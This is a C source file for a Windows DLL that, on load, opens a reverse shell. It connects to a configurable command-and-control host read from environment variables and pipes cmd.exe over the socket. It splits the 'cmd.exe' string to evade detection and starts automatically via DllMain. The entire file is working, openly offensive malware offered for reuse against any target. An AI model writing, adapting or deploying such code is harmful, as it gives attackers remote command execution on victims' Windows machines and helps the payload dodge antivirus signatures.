#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

/*
 * Read HOST and PORT from the environment so a single compiled DLL can be
 * pointed at any C2 without recompiling:
 *     set REV_HOST=1.2.3.4 && set REV_PORT=4444
 * Falls back to localhost:4444 if unset.
 */
static void GetC2(const char **host, int *port)
{
    const char *h = getenv("REV_HOST");
    char pbuf[16] = "";
    const char *p = getenv("REV_PORT");
    if (!h || !*h) h = "127.0.0.1";
    if (p && *p) { strncpy(pbuf, p, sizeof(pbuf) - 1); pbuf[sizeof(pbuf) - 1] = 0; }
    else strcpy(pbuf, "4444");
    *host = h;
    *port = atoi(pbuf);
}

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

// Adapted from https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c
void ReverseShell()
{
    const char *host;
    int port;
    GetC2(&host, &port);

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *he = gethostbyname(host);
    if (he && he->h_addr) strcpy(aip_addr, inet_ntoa(*((struct in_addr *)he->h_addr)));
    else strcpy(aip_addr, host);

    hax.sin_family = AF_INET;
    hax.sin_port = htons((unsigned short)port);
    hax.sin_addr.s_addr = inet_addr(aip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    if (WSAGetLastError() == 0) {

        memset(&ini_processo, 0, sizeof(ini_processo));

        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        char *myArray[4] = { "cm", "d.e", "x", "e" };
        char command[8] = "";
        snprintf(command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    }
}

DWORD WINAPI MainThread(LPVOID lpParam)
{
    ReverseShell();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread;

    if (fdwReason == DLL_PROCESS_ATTACH)
        hThread = CreateThread(0, 0, MainThread, 0, 0, 0);

    return TRUE;
}
